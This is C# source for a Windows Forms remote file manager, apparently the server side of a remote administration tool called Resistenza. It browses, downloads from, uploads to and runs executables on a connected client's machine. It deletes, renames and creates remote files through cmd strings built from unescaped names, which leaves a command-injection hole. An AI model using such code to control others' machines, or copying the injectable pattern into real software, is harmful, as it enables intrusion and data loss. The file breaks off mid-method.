using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;


using System.Net.Http.Headers;
using System.Reflection.Metadata.Ecma335;
using Microsoft.CodeAnalysis.CSharp;
using System.Security.Cryptography.X509Certificates;
using System.Runtime.InteropServices;
using System.Timers;


using Resistenza.Server.Networking;
using Resistenza.Common.Packets;
using Resistenza.Server.Utilities;
using Resistenza.Common.Tools;
using Etier.IconHelper;
using System.Runtime.CompilerServices;
using Resistenza.Common.Packets.Logic;
using Resistenza.Common.Packets.Command;
using static System.Windows.Forms.VisualStyles.VisualStyleElement;
using ScrollBar = System.Windows.Forms.ScrollBar;
using System.Linq.Expressions;
using System.Management.Automation;
using Microsoft.CSharp.RuntimeBinder;

namespace Resistenza.Server.Forms
{
    public partial class FrmFileManager : Form
    {

        private ConnectedClient _client;
        private string PreviousLocalDir;
        private string PreviousRemoteDir;
        private (bool IsAdding, string NewName) IsUserAddingAFolder;
        private (bool IsRenaming, string OriginalName) IsUserRenamingAnItem;
        private FileSystemWatcher LocalFileWatcher;

        public event EventHandler ClientConnectionDied;

        private Rectangle LocaldragBoxFromMouseDown;
        private int LocalrowIndexFromMouseDown;
        private int LocalrowIndexOfItemUnderMouseToDrop;

        private Rectangle RemotedragBoxFromMouseDown;
        private int RemoterowIndexFromMouseDown;
        private int RemoterowIndexOfItemUnderMouseToDrop;

        private DataGridViewRow ExampleRow; //presa come esempio per clonare da alcuni metodi
        private bool IsBackspaceLastKeyPressedInLocalTextbox;

        private CancellationTokenSource _GenericRemoteOperationCancellation;

        private bool _LongRunningOperationPending;
        private bool LongRunningOperationPending
        {
            get { return _LongRunningOperationPending; }
            set
            {
                if (value)
                {
                    CancelRemoteOperationIcon.Visible = true;
                }
                else
                {
                    CancelRemoteOperationIcon.Visible = false;
                }
                _LongRunningOperationPending = value;
            }
        }






        public FrmFileManager(ConnectedClient TargetClient)
        {
            InitializeComponent();
            _client = TargetClient;
            _GenericRemoteOperationCancellation = new CancellationTokenSource();
            LongRunningOperationPending = false;


            LocalFilesTextBox.Text = "C:\\Users\\" + Environment.UserName;
            PreviousLocalDir = LocalFilesTextBox.Text;


            RemoteFilePathTextbox.Text = "C:\\Users\\" + TargetClient.UserName;
            PreviousRemoteDir = RemoteFilePathTextbox.Text;

            IsUserAddingAFolder = (false, string.Empty);
            IsUserRenamingAnItem = (false, string.Empty);

            LocalFileWatcher = new FileSystemWatcher();
            LocalFileWatcher.Path = @"C:\";
            LocalFileWatcher.IncludeSubdirectories = true;
            LocalFileWatcher.EnableRaisingEvents = true;

            FileWatcherSubscribe();



            TargetClient.IncomingPacket += OnClientRead;


            foreach (DataGridViewColumn column in LocalFilesGrid.Columns)
            {
                column.SortMode = DataGridViewColumnSortMode.NotSortable; // Impedisce il clic sul header per ordinare
                column.Selected = false; // Impedisce la selezione dell'header
            }
            foreach (DataGridViewColumn column in RemoteFilesGrid.Columns)
            {
                column.SortMode = DataGridViewColumnSortMode.NotSortable; // Impedisce il clic sul header per ordinare
                column.Selected = false; // Impedisce la selezione dell'header
            }


        }

        protected override async void OnFormClosing(FormClosingEventArgs e)
        {
            base.OnFormClosing(e);

            // Rimuovi l'handler dell'evento MyEvent


            await _client.CustomStream.SendPacketAsync(new CancelRemoteOperationRequest() { TaskId = TasksIds.ALL_ACTIONS });



            _client.IncomingPacket -= OnClientRead; // MyEventHandlerMethod è il metodo che gestisce l'evento


        }


        private void FileWatcherSubscribe()
        {
            LocalFileWatcher.Deleted += LocalFileWatcher_SyncGrid;
            LocalFileWatcher.Created += LocalFileWatcher_SyncGrid;
            LocalFileWatcher.Changed += LocalFileWatcher_SyncGrid;
            LocalFileWatcher.Renamed += LocalFileWatcher_SyncGrid;
        }

        private void FileWatcherUnsubscribe()
        {
            LocalFileWatcher.Deleted -= LocalFileWatcher_SyncGrid;
            LocalFileWatcher.Created -= LocalFileWatcher_SyncGrid;
            LocalFileWatcher.Changed -= LocalFileWatcher_SyncGrid;
            LocalFileWatcher.Renamed -= LocalFileWatcher_SyncGrid;
        }



        private async void OnClientRead(dynamic PacketReceived)
        {



            try
            {
                if (PacketReceived.Error != null && PacketReceived.Error != string.Empty)
                {

                    if (PacketReceived is DirectoryDataResponse)
                    {
                        await RequestDirectoryData(PreviousRemoteDir);
                        RemoteFilePathTextbox.Text = PreviousRemoteDir;
                    }

                    await MessageBoxAsync.MessageBoxErrorAsync("Error from client", $"{PacketReceived.Error}");

                    return;
                }
            }
            catch (RuntimeBinderException)
            {
                //è arrivato un pacchetto che non implementa .Error, questo può essere avvenuto perche lo user ha cambiato form mentre un altro 
                //comando era in corso e il client stava ancora inviando dati
                return;
            }




            switch (PacketReceived)
            {

                case DirectoryDataResponse:
                    Invoke(() => OnDirectoryDataResponse((DirectoryDataResponse)PacketReceived));
                    return;
                case ExecuteCommandResponse:
                    await OnShellCommandOutput((ExecuteCommandResponse)PacketReceived);
                    return;
                case FileDownloadResponse:
                    await OnFileDownloadResponse((FileDownloadResponse)PacketReceived);
                    return;
                case FileUploadResponse:
                    await OnFileUploadResponse((FileUploadResponse)PacketReceived);
                    return;
                case MountedPartitionsResponse:
                    OnMountedPartitionsResponse((MountedPartitionsResponse)PacketReceived);
                    return;
                case CancelRemoteOperationResponse:
                    if (((CancelRemoteOperationResponse)PacketReceived).TaskId == TasksIds.CLIENT_DOWNLOAD_TASK_ID)
                    {
                        await OnCancelRemoteOperationResponse((CancelRemoteOperationResponse)PacketReceived);
                    }

                    return;

            }
        }

        private async Task OnCancelRemoteOperationResponse(CancelRemoteOperationResponse CancelResponse)
        {
            _GenericRemoteOperationCancellation = new CancellationTokenSource(); //reset dell'oggetto
            FileBeingProcessedLabel.Visible = true;
            FileBeingProcessedLabel.Text = "Operation cancelled!";
            LongRunningOperationPending = false;
            await Task.Delay(2000);
            FileBeingProcessedLabel.Visible = false;

        }


        private async Task OnFileUploadResponse(FileUploadResponse UploadedFileResponse)
        {

            if (UploadedFileResponse.IsLastOfRequest)
            {
                FileBeingProcessedLabel.Text = "Done!";
                FileBeingProcessedLabel.Text = "Done!";
                await Task.Delay(200);
                FileBeingProcessedLabel.Visible = false;
                await RequestDirectoryData(RemoteFilePathTextbox.Text);
                LongRunningOperationPending = false;
            }


        }

        private ContextMenuStrip CreatePartitionsMenu(List<DriveInformation> DriveInfoCollection)
        {
            var PartitionsMenu = new ContextMenuStrip();

            foreach (DriveInformation Info in DriveInfoCollection)
            {
                var PartitionItem = new ToolStripMenuItem(Info.RootDirectory);
                switch (Info.DriveType)
                {
                    case DriveType.Fixed:
                        PartitionItem.Image = Properties.Resources.fixed_drive;
                        break;
                    case DriveType.Network:
                        PartitionItem.Image = Properties.Resources.networkunit;
                        break;
                    case DriveType.CDRom:
                        PartitionItem.Image = Properties.Resources.cdrom;
                        break;
                    case DriveType.Removable:
                        PartitionItem.Image = Properties.Resources.removable_drive;
                        break;



                }

                PartitionsMenu.Items.Add(PartitionItem);

            }

            return PartitionsMenu;
        }

        private void OnMountedPartitionsResponse(MountedPartitionsResponse MountedPartitions)
        {

            ContextMenuStrip RemotePartitionsMenu = CreatePartitionsMenu(MountedPartitions.RootAndType);
            RemotePartitionsMenu.Show(MousePosition);
            RemotePartitionsMenu.ItemClicked += OnNewRemotePartitionChoosen;


        }

        private async Task OnShellCommandOutput(ExecuteCommandResponse ShellOutput)
        {


            if (IsUserAddingAFolder.IsAdding)
            {
                IsUserAddingAFolder.IsAdding = false;
                IsUserAddingAFolder.NewName = string.Empty;
                RemoteFilesGrid.ClearSelection();
                RemoteFilesGrid.Rows[0].Selected = true;
                return;
            }
            await RequestDirectoryData(RemoteFilePathTextbox.Text);
        }

        private async Task OnFileDownloadResponse(FileDownloadResponse FileReceived)
        {

            string LocalTargetFilePath = Path.Join(LocalFilesTextBox.Text, FileReceived.FileName);

            FileBeingProcessedLabel.Text = "Downloading " + FileReceived.FileName.Split("\\").Last() + "...";
            FileBeingProcessedLabel.Visible = true;


            FileInfo FiInfo = new FileInfo(LocalTargetFilePath);
            FiInfo.Directory.Create();
            if (FileReceived.FileBytes != null) //lo user potrebbe semplicemente fare il downwload di una directory vuota
            {
                byte[] Decompressed = FastCompression.Decompress(FileReceived.FileBytes);
                if (FileReceived.IsPart)
                {
                    using (var Stream = new FileStream(LocalTargetFilePath, FileMode.Append))
                    {
                        Stream.Write(Decompressed, 0, Decompressed.Length);
                    }

                }
                else
                {
                    await File.WriteAllBytesAsync(LocalTargetFilePath, Decompressed);
                }



            }
            else
            {
                Directory.CreateDirectory(LocalTargetFilePath);
            }

            if (FileReceived.IsLastOfRequest)
            {
                LongRunningOperationPending = false;
                //await AddContentToLocalGridAsync();
                FileBeingProcessedLabel.Visible = false;
                LongRunningOperationPending = false;

            }

            //FileBeingDownloadedLabel.Visible = false;







        }




        private void OnDirectoryDataResponse(DirectoryDataResponse ReceivedEntries)
        {

            if (ReceivedEntries.Directory != RemoteFilePathTextbox.Text) //mentre la risposta stava arrivando, l'utente ha cambiato path remota, quindi il pacchetto viene ignorato
            {
                return;
            }


            RemoteEmptyFolderLabel.Visible = false;

            string CurrentRemotePath = RemoteFilePathTextbox.Text;

            if (ReceivedEntries.Directory != string.Empty && ReceivedEntries.Directory != CurrentRemotePath)
            {
                return;
            }

            if (ReceivedEntries.AllEntries.Count == 0)
            {
                RemoteEmptyFolderLabel.Visible = true;
                RemoteEmptyFolderLabel.Visible = true;
            }
            //la cartella è vouta

            RemoteFilesGrid.UseWaitCursor = false;

            RemoteFilesGrid.Rows.Clear();


            int RowNumber = 0;
            foreach (var Entry in ReceivedEntries.AllEntries)
            {

                RemoteFilesGrid.Rows.Add(1);

                DataGridViewRow Row = (DataGridViewRow)RemoteFilesGrid.Rows[RowNumber];
                // Row.ReadOnly = true;
                if (Entry.IsDirectory)
                {

                    ((DataGridViewImageCell)RemoteFilesGrid.Rows[RowNumber].Cells[0]).Value = Properties.Resources.folder;

                    Row.Cells[1].Value = Entry.Name;


                }
                else
                {

                    Icon IconAssociatedToExt = IconReader.GetFileIcon(Entry.Name, IconReader.IconSize.Small, false);

                    Row.Cells[0].Value = IconAssociatedToExt;
                    Row.Cells[1].Value = Entry.Name;
                    Row.Cells[2].Value = CalculateMultipleOfBytes(Entry.FileSizeBytes);
                    Row.Cells[3].Value = Entry.LastChange;
                }
                //Row.Cells[4].Value = Entry.IsDirectory;
                RowNumber++;
            }


        }





        public async void LocalFileWatcher_SyncGrid(object Sender, FileSystemEventArgs e)
        {

            if (Directory.GetParent(e.FullPath) != null && Directory.GetParent(e.FullPath).FullName == LocalFilesTextBox.Text)
            {
                await Invoke(async () => await AddContentToLocalGridAsync());
            }


        }
        private void localFilesGrid_CellContentClick(object sender, DataGridViewCellEventArgs e)
        {

        }

        private static string CalculateMultipleOfBytes(int TotalBytes)
        {
            switch (TotalBytes)
            {
                case 0:
                    return "0 KB";
                case int n when (n > 0 && n < 1048576): // 1 megabyte 
                    return $"{(int)TotalBytes / 1024} KB";
                case int n when (n > 0 && n < 1073741824):
                    return $"{(int)TotalBytes / 1048576} MB";
                default:
                    return $"{TotalBytes.ToString().Substring(0, 1)} GB";



            }

        }

        private async void HandleTimeoutAsync(string IndentificationTimerString)
        {
            MessageBox.Show("timeout");
        }

        private async void OnNewRemotePartitionChoosen(object? sender, ToolStripItemClickedEventArgs e)
        {
            RemoteFilePathTextbox.Text = e.ClickedItem.Text;
            await RequestDirectoryData(e.ClickedItem.Text);
        }



        private async Task RequestDirectoryData(string DirectoryName)
        {

            RemoteFilesGrid.Rows.Clear();

            DirectoryDataRequest Pkt = new DirectoryDataRequest
            {
                Directory = DirectoryName,

            };

            await _client.CustomStream.SendPacketAsync(Pkt);


            RemoteFilesGrid.UseWaitCursor = true;
        }

        private async Task AddContentToLocalGridAsync()
        {


            string[] DirEntries;

            //ci assicuriamo che la directory esista
            if (!Directory.Exists(LocalFilesTextBox.Text))
            {
                LocalFilesTextBox.Text = PreviousLocalDir;
                return;
            }

            //ci assicuriamo che abbiamo accesso alla directory

            try
            {
                DirEntries = Directory.GetDirectories(LocalFilesTextBox.Text);
            }
            catch (UnauthorizedAccessException)
            {
                await MessageBoxAsync.MessageBoxErrorAsync("Access denied", "Access to this folder is denied, you can try restarting the server with admin privileges");
                return;
            }

            //se tutti e due i requisiti sono soddisfatti, puliamo i dati della vecchia griglia

            LocalFilesGrid.Rows.Clear();

            var FileEntries = Directory.EnumerateFiles(LocalFilesTextBox.Text, "*", new EnumerationOptions
            {
                IgnoreInaccessible = true,
                RecurseSubdirectories = false,

            });

            var AllEntries = FileEntries.Concat(DirEntries);

            if (AllEntries.Count() == 0)
            {
                //non sono presenti ne file ne directories

                LocalEmptyFolderLabel.Visible = true;
                return;

            }

            int RowNumber = 0;

            foreach (string FileOrDir in AllEntries)
            {

                FileAttributes attr;

                try
                {
                    attr = File.GetAttributes(FileOrDir);

                }
                catch (FileNotFoundException)
                {
                    return;
                }


                LocalFilesGrid.Rows.Add(1);



                DataGridViewRow Row = (DataGridViewRow)LocalFilesGrid.Rows[RowNumber];



                if ((attr & FileAttributes.Directory) == FileAttributes.Directory)
                {

                    ((DataGridViewImageCell)LocalFilesGrid.Rows[RowNumber].Cells[0]).Value = Properties.Resources.folder;

                    Row.Cells[1].Value = FileOrDir.Split("\\").Last();

                    RowNumber++;
                    continue;
                }

                FileInfo fileInfo = new FileInfo(FileOrDir);
                Icon FileIcon = Icon.ExtractAssociatedIcon(FileOrDir);
                Icon ResizedIcon;

                using (Bitmap ResizedImage = new Bitmap(16, 16))
                {
                    using (Graphics g = Graphics.FromImage(ResizedImage))
                    {
                        g.DrawIcon(FileIcon, new Rectangle(0, 0, 16, 16));

                    }
                    ResizedIcon = Icon.FromHandle(ResizedImage.GetHicon());

                }

                Row.Cells[0].Value = ResizedIcon;
                Row.Cells[1].Value = FileOrDir.Split("\\").Last();
                Row.Cells[2].Value = CalculateMultipleOfBytes((int)fileInfo.Length);
                Row.Cells[3].Value = fileInfo.LastWriteTime;
                RowNumber++;
                ExampleRow = (DataGridViewRow)Row.Clone();
            }

            PreviousLocalDir = LocalFilesTextBox.Text;

        }

        private async void localPathTextbox_KeyPress(object sender, KeyPressEventArgs e)
        {
            if (e.KeyChar == (char)Keys.Enter)
            {

                await AddContentToLocalGridAsync();

            }

            //localFilesGrid.Rows.RemoveAt(localFilesGrid.Rows.Count - 1);


        }

        private void localFilesGrid_CellContentDoubleClick(object sender, DataGridViewCellEventArgs e)
        {

        }

        private async void localFilesGrid_CellDoubleClick(object sender, DataGridViewCellEventArgs e)
        {

            if (e.RowIndex == -1)// è stato cliccato l'header della griglia
            {
                return;
            }



            int RowNumber = e.RowIndex;
            if (Directory.Exists(PreviousLocalDir + "\\" + LocalFilesGrid.Rows[RowNumber].Cells[1].Value))
            {
                if (LocalFilesTextBox.Text.EndsWith("\\"))
                {
                    LocalFilesTextBox.Text = LocalFilesTextBox.Text + LocalFilesGrid.Rows[e.RowIndex].Cells[1].Value;

                }
                else
                {
                    LocalFilesTextBox.Text = PreviousLocalDir + "\\" + LocalFilesGrid.Rows[RowNumber].Cells[1].Value;
                }

                await AddContentToLocalGridAsync();

            }
        }

        private async void RemoteFilesGrid_CellDoubleClick(object sender, DataGridViewCellEventArgs e)
        {
            if (e.RowIndex == -1)// è stato cliccato l'header della griglia
            {
                return;
            }

            if (RemoteFilesGrid.Rows[e.RowIndex].Cells[3].Value == null)
            {
                if (RemoteFilePathTextbox.Text.EndsWith("\\"))
                {
                    RemoteFilePathTextbox.Text = RemoteFilePathTextbox.Text + RemoteFilesGrid.Rows[e.RowIndex].Cells[1].Value;

                }
                else
                {
                    RemoteFilePathTextbox.Text = RemoteFilePathTextbox.Text + "\\" + RemoteFilesGrid.Rows[e.RowIndex].Cells[1].Value;
                }
                await RequestDirectoryData(RemoteFilePathTextbox.Text);
                //PreviousLocalDir = RemoteFilePathTextbox.Text;
            }
        }

        private async void RemoteFilePathTextbox_KeyPress(object sender, KeyPressEventArgs e)
        {
            if (e.KeyChar == (char)Keys.Enter)
            {

                await RequestDirectoryData(RemoteFilePathTextbox.Text);

            }
        }

        private static List<string> RecursiveDirectoryIterator(string DirPath)
        {
            var AllFiles = new List<string>();


            foreach (var File in Directory.GetFiles(DirPath))
            {
                AllFiles.Add(Path.Combine(DirPath, File));
            }

            foreach (var SubDir in Directory.GetDirectories(DirPath))
            {
                AllFiles.AddRange(RecursiveDirectoryIterator(SubDir));
            }

            return AllFiles;


        }

        private async Task UploadFilesToClientAsync(string[] FilePathsToUpload, CancellationToken DeleteOperation)
        {
            LongRunningOperationPending = true;
            FileBeingProcessedLabel.Visible = true;

            try
            {
                foreach (string FileOrDir in FilePathsToUpload)
                {

                    if (DeleteOperation.IsCancellationRequested)
                    {
                        throw new OperationCanceledException(DeleteOperation);
                    }

                    FileUploadRequest UploadRequest = new FileUploadRequest();

                    if (Directory.Exists(FileOrDir))
                    {
                        //Prima viene creata la directory nel client remoto, poi vengono trasferiti i files

                        FileBeingProcessedLabel.Text = "Retrieving the number of files to upload...";
                        int NumberOfFiles = Directory.GetFiles(FileOrDir, "*", SearchOption.AllDirectories).Length;

                        if (NumberOfFiles == 0)
                        {
                            //si vuole caricare una directory vuota
                            string RemoteDestination = Path.Join(RemoteFilePathTextbox.Text, FileOrDir.Split("\\").Last());
                            await CreateRemoteDirectoryAsync(RemoteDestination);
                            return;
                        }


                        List<string> AllFilesPathsInDir = RecursiveDirectoryIterator(FileOrDir);

                        foreach (string FileEntry in AllFilesPathsInDir)
                        {
                            DeleteOperation.ThrowIfCancellationRequested();

                            string RemoteDirPart = "";

                            //Non sono del tutto in grado di spiegare che succede qui, ma è necessario per poi unire le due parti della destinazione della
                            //directory remota, quella base che già conoscevamo e quella passata dal filesystem locale

                            foreach (var Chunk in FileEntry.Split("\\").Reverse())
                            {
                                if (FileOrDir.Split("\\").Contains(Chunk))
                                {
                                    RemoteDirPart = RemoteDirPart.Insert(0, Chunk);

                                    break;
                                }
                                else
                                {
                                    RemoteDirPart = RemoteDirPart.Insert(0, "\\" + Chunk);
                                }
                            }

                            string FinalFilePath = Path.Combine(RemoteFilePathTextbox.Text, RemoteDirPart);

                            FileBeingProcessedLabel.Text = "Uploading " + FileEntry + "...";

                            if (!await _client.SendFileAsync(FileEntry, FinalFilePath, FileEntry == AllFilesPathsInDir.Last() && FileOrDir == FilePathsToUpload.Last(), _GenericRemoteOperationCancellation.Token))
                            {
                                FileBeingProcessedLabel.Visible = false;
                                return;
                            }

                            await Task.Delay(300);

                        }
                    }

                    else
                    {
                        //è un file

                        string RemoteFilePath = RemoteFilePathTextbox.Text + "\\" + FileOrDir.Split('\\').Last();
                        FileBeingProcessedLabel.Text = "Uploading " + FileOrDir + "...";

                        if (!await _client.SendFileAsync(FileOrDir, RemoteFilePath, FileOrDir == FilePathsToUpload.Last(), _GenericRemoteOperationCancellation.Token))
                        {
                            FileBeingProcessedLabel.Visible = false;
                            return;
                        }

                        await Task.Delay(300);

                    }
                }
            }
            catch (OperationCanceledException)
            {
                DeleteOperation.ThrowIfCancellationRequested();
            }

        }

        private async Task DeleteRemoteFiles()
        {
            DataGridViewSelectedRowCollection SelectedRows = RemoteFilesGrid.SelectedRows;
            string DeleteCommand = "";

            foreach (DataGridViewRow Row in SelectedRows)
            {
                if (RemoteFilesGrid.Rows[Row.Index].Cells[2].Value == null)
                {
                    //è una directory

                    DeleteCommand += $"rmdir /Q /S \"{RemoteFilePathTextbox.Text}\\{Row.Cells[1].Value}\" & ";
                }
                else
                {
                    //è un file 
                    DeleteCommand += $"del /Q /F \"{RemoteFilePathTextbox.Text}\\{Row.Cells[1].Value}\" &";
                }
            }

            var DeletePkt = new ExecuteCommandRequest
            {
                Command = DeleteCommand,

            };

            if (!await _client.CustomStream.SendPacketAsync(DeletePkt))
            {
                return;
            }
            ;



        }

        private void RemoteFilesGrid_DragEnter(object sender, DragEventArgs e)
        {
            e.Effect = DragDropEffects.All;
        }



        private void progressBar1_Click(object sender, EventArgs e)
        {

        }

        private void RemoteFilesGrid_CellContentClick(object sender, DataGridViewCellEventArgs e)
        {

        }

        private void RemoteFilesGrid_MouseClick(object sender, MouseEventArgs e)
        {

            bool IsOnlyOneItemSelected = (RemoteFilesGrid.SelectedRows.Count == 1);
            var FileActionsMenu = new ContextMenuStrip();
            if (e.Button == MouseButtons.Right)
            {
                var HitInfo = RemoteFilesGrid.HitTest(e.X, e.Y);
                bool IsMouseOnSelectedRow = false;


                DataGridViewSelectedRowCollection SelectedRows = RemoteFilesGrid.SelectedRows;
                foreach (DataGridViewRow SelectedRow in SelectedRows)
                {
                    if (SelectedRow.Index == HitInfo.RowIndex)
                    {
                        IsMouseOnSelectedRow = true;
                    }
                }


                FileActionsMenu.ItemClicked += FileActionsMenu_ItemClicked;

                if (IsMouseOnSelectedRow)
                {
                    var DeleteItem = new ToolStripMenuItem("Delete");
                    DeleteItem.Image = Properties.Resources.trashbin;
                    FileActionsMenu.Items.Add(DeleteItem);

                    var DownloadItem = new ToolStripMenuItem("Download");
                    DownloadItem.Image = Properties.Resources.download;
                    DownloadItem.Enabled = !LongRunningOperationPending;
                    FileActionsMenu.Items.Add(DownloadItem);

                    if (IsOnlyOneItemSelected)
                    {
                        var RenameItem = new ToolStripMenuItem("Rename");
                        RenameItem.Image = Properties.Resources.rename_file_or_folder;
                        FileActionsMenu.Items.Add(RenameItem);
                    }

                    if (((string)RemoteFilesGrid.Rows[HitInfo.RowIndex].Cells[1].Value).EndsWith(".exe") && IsOnlyOneItemSelected)
                    {
                        var Execute = new ToolStripMenuItem("Execute");
                        Execute.Image = Properties.Resources.executable;
                        FileActionsMenu.Items.Add(Execute);
                    }
                }

                var NewFolderItem = new ToolStripMenuItem("New folder");
                NewFolderItem.Image = Properties.Resources.new_folder;
                FileActionsMenu.Items.Add(NewFolderItem);
                FileActionsMenu.Show(MousePosition);
            }


        }


        private async void FileActionsMenu_ItemClicked(object sender, ToolStripItemClickedEventArgs e)
        {

            DataGridViewSelectedRowCollection SelectedRows = RemoteFilesGrid.SelectedRows;

            switch (e.ClickedItem.Text)

            {
                case "Delete":
                    await DeleteRemoteFiles(); //implementato in un'altra funzione perchè è associato anche ad un altro evento ossia quando l'utente preme delete sulla tastiera  
                    return;

                case "Download":

                    LongRunningOperationPending = true;


                    foreach (DataGridViewRow Row in SelectedRows)
                    {
                        LongRunningOperationPending = true;
                        bool IsDir = RemoteFilesGrid.Rows[Row.Index].Cells[3].Value == null;
                        string RemotePath = $"{RemoteFilePathTextbox.Text}\\{Row.Cells[1].Value}";
                        await _client.RequestFileDownloadAsync(RemotePath, IsDir);
                    }

                    return;
                case "New folder":

                    DataGridViewRow NewFolderRow = new DataGridViewRow();

                    if (!RemoteEmptyFolderLabel.Visible)
                    {
                        NewFolderRow = (DataGridViewRow)RemoteFilesGrid.Rows[0].Clone();
                        ((DataGridViewImageCell)NewFolderRow.Cells[0]).Value = Properties.Resources.folder;
                    }
                    else
                    {
                        NewFolderRow = ExampleRow;
                        NewFolderRow.Cells[0].Value = Properties.Resources.folder;
                    }
                    RemoteEmptyFolderLabel.Visible = false;


                    RemoteFilesGrid.Rows.Insert(0, NewFolderRow);

                    RemoteFilesGrid.SelectionMode = DataGridViewSelectionMode.CellSelect;
                    NewFolderRow.Cells[1].Value = "New Folder";
                    //RemoteFilesGrid.RowsDefaultCellStyle.SelectionBackColor = System.Drawing.Color.Transparent;
                    RemoteFilesGrid.ReadOnly = false;
                    RemoteFilesGrid.CurrentCell = NewFolderRow.Cells[1];
                    RemoteFilesGrid.BeginEdit(true);


                    IsUserAddingAFolder = (IsAdding: true, NewName: string.Empty); //non sappiamo ancora il nome, è gestito da un evneto

                    return;
                case "Rename":

                    DataGridViewRow RowToRename = SelectedRows[0];



                    RemoteFilesGrid.SelectionMode = DataGridViewSelectionMode.CellSelect;
                    RemoteFilesGrid.ReadOnly = false;
                    RemoteFilesGrid.CurrentCell = RowToRename.Cells[1];
                    RemoteFilesGrid.BeginEdit(true);

                    IsUserRenamingAnItem = (true, (string)RowToRename.Cells[1].Value);


                    return;
                case "Execute":

                    DataGridViewRow FileToExecute = SelectedRows[0];

                    var Command = new ExecuteCommandRequest
                    {
                        Command = $"\"{Path.Join(RemoteFilePathTextbox.Text, (string)FileToExecute.Cells[1].Value)}\"",


                    };

                    if (!await _client.CustomStream.SendPacketAsync(Command))
                    {
                        return;
                    }



                    return;



                default:
                    return;
            }
        }

        private async Task CreateRemoteDirectoryAsync(string DirectoryPath)
        {
            var NewFolderCommand = new ExecuteCommandRequest
            {
                Command = $"mkdir \"{DirectoryPath}\"",

            };

            if (!await _client.CustomStream.SendPacketAsync(NewFolderCommand))
            {
                return;
            }

        }

        private async void RemoteFilesGrid_CellEndEdit(object sender, DataGridViewCellEventArgs e)


        {
            if (e.RowIndex == 0 && IsUserAddingAFolder.IsAdding) //è stata aggiunta una  cartella, la validià del nome deve essere verificata
            {
                DataGridViewRow NewFolderRow = RemoteFilesGrid.Rows[e.RowIndex];
                string NewFolderName = (string)NewFolderRow.Cells[1].Value;
                if (NewFolderName == "" || NewFolderName == null)
                {
                    RemoteFilesGrid.Rows.Remove(NewFolderRow);
                    IsUserAddingAFolder = (IsAdding: false, NewName: string.Empty);

                }
                else
                {
                    await CreateRemoteDirectoryAsync(Path.Join(RemoteFilePathTextbox.Text, NewFolderName));

                }

                ResetRemoteGridToStandard();



            }

            if (IsUserRenamingAnItem.IsRenaming)
            {
                DataGridViewRow ItemRenamed = RemoteFilesGrid.Rows[e.RowIndex];
                string NewName = (string)ItemRenamed.Cells[1].Value;

                if (NewName == "" || NewName == null)
                {
                    ItemRenamed.Cells[1].Value = IsUserRenamingAnItem.OriginalName;
                }
                else
                {
                    var RenamingCommand = new ExecuteCommandRequest
                    {
                        Command = $"rename \"{Path.Join(RemoteFilePathTextbox.Text, IsUserRenamingAnItem.OriginalName)}\" \"{NewName}\"",

                    };
                    ResetRemoteGridToStandard();
                    if (!await _client.CustomStream.SendPacketAsync(RenamingCommand))
                    {
                        return;
                    }

                    //IsUserAddingAFolder.IsAdding = true;
                    //IsUserAddingAFolder.NewName = NewName;

                }

            }
        }

        private void ResetRemoteGridToStandard()
        {
            RemoteFilesGrid.SelectionMode = DataGridViewSelectionMode.FullRowSelect;
            RemoteFilesGrid.ReadOnly = true;
            RemoteFilesGrid.ClearSelection();
            RemoteFilesGrid.Update();

        }

        private void ResetLocalGridToStandard()
        {

            //localFilesGrid.ClearSelection();



            LocalFilesGrid.SelectionMode = DataGridViewSelectionMode.FullRowSelect;
            LocalFilesGrid.ReadOnly = true;
            LocalFilesGrid.ClearSelection();
            LocalFilesGrid.Update();





        }

        private void localFilesGrid_CellContentClick_1(object sender, DataGridViewCellEventArgs e)
        {

        }

        private async Task OnLocalOperationCancelled()
        {
            CancelRemoteOperationIcon.Visible = false;
            FileBeingProcessedLabel.Text = "Operation cancelled!";
            await Task.Delay(500);
            FileBeingProcessedLabel.Visible = false;
            LongRunningOperationPending = false;
            _GenericRemoteOperationCancellation = new CancellationTokenSource();
        }

        private async void FileActionsMenuLocal_ItemClicked(object sender, ToolStripItemClickedEventArgs e)
        {

            List<string> SelectedItemsPath = new List<string> { };

            foreach (DataGridViewRow Row in LocalFilesGrid.SelectedRows)
            {
                SelectedItemsPath.Add(Path.Join(LocalFilesTextBox.Text, (string)Row.Cells[1].Value));
            }



            switch (e.ClickedItem.Text)
            {
                case "Delete":
                    foreach (var Path in SelectedItemsPath)
                    {
                        if (Directory.Exists(Path))
                        {
                            Directory.Delete(Path, true);
                        }
                        else
                        {
                            File.Delete(Path);
                        }
                    }
                    break;
                case "Upload":
                    try
                    {
                        await UploadFilesToClientAsync(SelectedItemsPath.ToArray(), _GenericRemoteOperationCancellation.Token);
                    }
                    catch (OperationCanceledException)
                    {
                        await OnLocalOperationCancelled();
                    }


                    break;

                case "Rename":

                    DataGridViewRow RowToRename = LocalFilesGrid.SelectedRows[0];
                    LocalFilesGrid.SelectionMode = DataGridViewSelectionMode.CellSelect;
                    LocalFilesGrid.ReadOnly = false;
                    LocalFilesGrid.CurrentCell = RowToRename.Cells[1];
                    LocalFilesGrid.BeginEdit(true);

                    IsUserRenamingAnItem = (true, (string)RowToRename.Cells[1].Value);

                    return;
                case "New folder":

                    DataGridViewRow NewFolderRow = (DataGridViewRow)LocalFilesGrid.Rows[0].Clone();
                    ((DataGridViewImageCell)NewFolderRow.Cells[0]).Value = Properties.Resources.folder;

                    LocalFilesGrid.Rows.Insert(0, NewFolderRow);


                    LocalFilesGrid.SelectionMode = DataGridViewSelectionMode.CellSelect;
                    NewFolderRow.Cells[1].Value = "New Folder";
                    //RemoteFilesGrid.RowsDefaultCellStyle.SelectionBackColor = System.Drawing.Color.Transparent;
                    LocalFilesGrid.ReadOnly = false;
                    LocalFilesGrid.CurrentCell = NewFolderRow.Cells[1];
                    LocalFilesGrid.BeginEdit(true);


                    IsUserAddingAFolder = (IsAdding: true, NewName: string.Empty); //non sappiamo ancora il nome, è gestito da un evneto
                    return;

            }

            //AddContentToLocalGrid(); not necessary, there's a local watcher on files
        }

        private void localFilesGrid_MouseClick(object sender, MouseEventArgs e)
        {

            bool IsOnlyOneItemSelected = (LocalFilesGrid.SelectedRows.Count == 1);
            if (e.Button == MouseButtons.Right && LocalFilesGrid.SelectedRows.Count != 0)
            {
                var HitInfo = LocalFilesGrid.HitTest(e.X, e.Y);
                bool IsMouseOnSelectedRow = false;
                DataGridViewSelectedRowCollection SelectedRows = LocalFilesGrid.SelectedRows;
                foreach (DataGridViewRow SelectedRow in SelectedRows)
                {
